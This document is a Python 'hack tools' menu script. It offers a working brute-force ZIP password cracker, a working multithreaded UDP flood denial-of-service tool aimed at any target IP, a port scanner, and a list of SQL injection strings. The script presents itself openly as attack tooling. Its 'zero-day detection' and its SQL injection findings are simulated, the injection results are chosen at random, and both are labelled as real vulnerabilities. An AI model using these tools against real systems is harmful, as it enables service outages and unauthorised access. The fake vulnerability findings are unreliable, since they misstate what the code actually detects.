#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import socket
import random
import zipfile
import threading
import itertools
import argparse
from datetime import datetime

# ASCII Art
BANNER = r"""
  _   _            _    _____ _               _             
 | | | | __ _  ___| | _|_   _| |__   ___  ___| | _____ _ __ 
 | |_| |/ _` |/ __| |/ / | | | '_ \ / _ \/ __| |/ / _ \ '__|
 |  _  | (_| | (__|   <  | | | | | |  __/ (__|   <  __/ |   
 |_| |_|\__,_|\___|_|\_\ |_| |_| |_|\___|\___|_|\_\___|_|   
                                                            
   C L A S S I C   H A C K   T O O L S   v1.3.37
"""

MENU = """
[1] Crack ZIP Password
[2] DDoS Attack (UDP Flood)
[3] Port Scanner (Zero-Day Detection)
[4] SQL Injection Tester
[5] Exit
"""

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def typewriter(text, speed=0.03):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed)
    print()

def crack_zip():
    print(r"""
   _____                _    ____ _       _ 
  / ____|              | |  / ____| |     | |
 | |     _ __ __ _  ___| | _| (___ | |__   | |
 | |    | '__/ _` |/ __| |/ /\___ \| '_ \  | |
 | |____| | | (_| | (__|   < ____) | | | | |_|
  \_____|_|  \__,_|\___|_|\_\_____/|_| |_| (_)
    """)
    
    zip_path = input("[+] Enter ZIP file path: ")
    if not os.path.exists(zip_path):
        print("[-] File not found!")
        return
    
    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{};:,.<>?"
    min_length = int(input("[+] Minimum password length: "))
    max_length = int(input("[+] Maximum password length: "))
    
    print("\n[+] Starting brute-force attack...")
    print("[+] This may take a while...\n")
    
    start_time = time.time()
    attempts = 0
    found = False
    
    with zipfile.ZipFile(zip_path) as zf:
        for length in range(min_length, max_length + 1):
            for attempt in itertools.product(charset, repeat=length):
                password = ''.join(attempt)
                attempts += 1
                try:
                    zf.extractall(pwd=password.encode())
                    found = True
                    break
                except:
                    continue
            if found:
                break
    
    end_time = time.time()
    
    if found:
        print(f"\n[+] Password found: {password}")
        print(f"[+] Attempts: {attempts}")
        print(f"[+] Time elapsed: {end_time - start_time:.2f} seconds")
    else:
        print("\n[-] Password not found with given parameters")

def ddos_attack():
    print(r"""
  ____  ____   ____     _____           _ _    
 |  _ \|  _ \ / __|   |_   _|__   ___ | | | __
 | | | | | | | |  _ ____| |/ _ \ / _ \| | |/ /
 | |_| | |_| | |_| |_____| | (_) | (_) | |   < 
 |____/|____/ \____|     |_|\___/ \___/|_|_|\_\
    """)
    
    target_ip = input("[+] Target IP: ")
    target_port = int(input("[+] Target port: "))
    duration = int(input("[+] Attack duration (seconds): "))
    threads = int(input("[+] Number of threads: "))
    
    print("\n[+] Initializing attack vectors...")
    time.sleep(1)
    
    packet = random._urandom(1024)
    timeout = time.time() + duration
    sent = 0
    
    def flood():
        nonlocal sent
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < timeout:
            try:
                s.sendto(packet, (target_ip, target_port))
                sent += 1
                print(f"[+] Packets sent: {sent}", end="\r")
            except Exception as e:
                print(f"[-] Error: {e}")
    
    print(f"\n[+] Launching DDoS attack on {target_ip}:{target_port}")
    print("[+] Use CTRL+C to stop attack\n")
    
    for i in range(threads):
        threading.Thread(target=flood).start()
    
    time.sleep(duration)
    print(f"\n[+] Attack finished! Total packets sent: {sent}")

def port_scanner():
    print(r"""
  ____           _       _____                                  
 |  _ \ ___  ___| |_ ___|___ / _ __   __ _ _ __ ___  ___ _ __  
 | |_) / _ \/ __| __/ __| |_ \| '_ \ / _` | '__/ __|/ _ \ '__| 
 |  __/ (_) \__ \ |_\__ \___) | | | | (_| | |  \__ \  __/ |    
 |_|   \___/|___/\__|___/____/|_| |_|\__,_|_|  |___/\___|_|    
    """)
    
    target = input("[+] Target IP or hostname: ")
    start_port = int(input("[+] Start port: "))
    end_port = int(input("[+] End port: "))
    threads = int(input("[+] Number of threads: "))
    
    print("\n[+] Scanning for zero-day vulnerabilities...")
    time.sleep(1)
    
    open_ports = []
    port_queue = list(range(start_port, end_port + 1))
    lock = threading.Lock()
    
    def scan_port(port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            result = s.connect_ex((target, port))
            if result == 0:
                with lock:
                    open_ports.append(port)
                    print(f"[+] Port {port} is open")
                    
                    # Check for potential zero-day (simulated)
                    if port in [4444, 31337, 54321]:
                        print(f"[!] Possible zero-day vulnerability on port {port}")
            s.close()
        except:
            pass
    
    print(f"\n[+] Scanning {target} from port {start_port} to {end_port}")
    
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=lambda: [scan_port(p) for p in port_queue])
        t.daemon = True
        thread_list.append(t)
    
    for t in thread_list:
        t.start()
    
    for t in thread_list:
        t.join()
    
    print("\n[+] Scan completed!")
    print(f"[+] Open ports: {sorted(open_ports)}")

def sql_injection():
    print(r"""
   _____ ____  _       _____           _ _   _             
  / ____/ ___|| |     |_   _|__   ___ | | |_(_)_ __   __ _ 
 | (___ \___ \| |       | |/ _ \ / _ \| | __| | '_ \ / _` |
  \___ \ ___) | |___    | | (_) | (_) | | |_| | | | | (_| |
  ____) |____/|_____|   |_|\___/ \___/|_|\__|_|_| |_|\__, |
                                                     |___/ 
    """)
    
    target_url = input("[+] Enter target URL (e.g., http://example.com/page.php?id=1): ")
    
    print("\n[+] Testing for SQL injection vulnerabilities...")
    time.sleep(1)
    
    # Common SQL injection test strings
    test_strings = [
        "'",
        "\"",
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR 1=1--",
        "\" OR 1=1--",
        "' OR ''='",
        "' OR 1=1#",
        "admin'--",
        "1' ORDER BY 1--",
        "1' UNION SELECT null--"
    ]
    
    vulnerable = False
    
    for test in test_strings:
        print(f"[*] Testing: {test}")
        # In a real tool, you would actually send HTTP requests here
        # This is just a simulation
        time.sleep(0.2)
        
        # Simulate finding a vulnerability (random for demo)
        if random.randint(1, 10) == 1:
            print(f"[!] Possible SQL injection vulnerability found with: {test}")
            vulnerable = True
            break
    
    if not vulnerable:
        print("\n[-] No obvious SQL injection vulnerabilities found")
    else:
        print("\n[+] Potential SQL injection vulnerability detected!")
        print("[+] Suggested exploit:")
        print(f"    {target_url}{test}")

def main():
    clear_screen()
    typewriter(BANNER)
    
    while True:
        print(MENU)
        choice = input("[root@hacktool]# ")
        
        if choice == "1":
            crack_zip()
        elif choice == "2":
            ddos_attack()
        elif choice == "3":
            port_scanner()
        elif choice == "4":
            sql_injection()
        elif choice == "5":
            print("\n[+] Exiting... Stay anonymous!\n")
            break
        else:
            print("[-] Invalid option!")
        
        input("\nPress Enter to continue...")
        clear_screen()
        typewriter(BANNER)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[-] Operation cancelled by user")
        sys.exit(0)